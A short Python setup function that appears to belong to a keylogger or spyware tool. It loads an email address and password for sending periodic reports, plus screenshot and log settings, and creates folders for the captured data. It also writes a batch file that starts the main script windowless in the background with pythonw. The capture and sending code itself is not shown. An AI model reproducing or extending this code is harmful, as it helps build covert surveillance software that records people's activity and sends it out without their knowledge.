import json
import os
from file_utils import get_current_path, mkdir

def setup_env(self):
    path_to_env = get_current_path()
    env_file = open('{}/env_vars.json'.format(path_to_env))

    self.env_vars = json.load(env_file)
    self.encode = self.env_vars['ENCODE']
    self.send_report_every = self.env_vars['SEND_REPORT_EVERY']
    self.email = self.env_vars['EMAIL_ADDRESS']
    self.passwd = self.env_vars['EMAIL_PASSWORD']
    self.screenshot_path = "{}/{}".format(get_current_path(),
                                          self.env_vars["SCREENSHOT_PATH"])
    self.log_path = "{}/{}".format(get_current_path(),
                                   self.env_vars["LOG_PATH"])
    self.screenshot_interval = self.env_vars["SCREENSHOT_INTERVAL"]
    mkdir(self.log_path)
    mkdir(self.screenshot_path)

    folder = os.getcwd().replace('\\','/')
    bat_file = 'start /b pythonw.exe "{}\main.py"'.format(folder.replace("/","\\"))
    with open(f"{folder}/open.bat", "w") as f:
        print(bat_file, file=f)
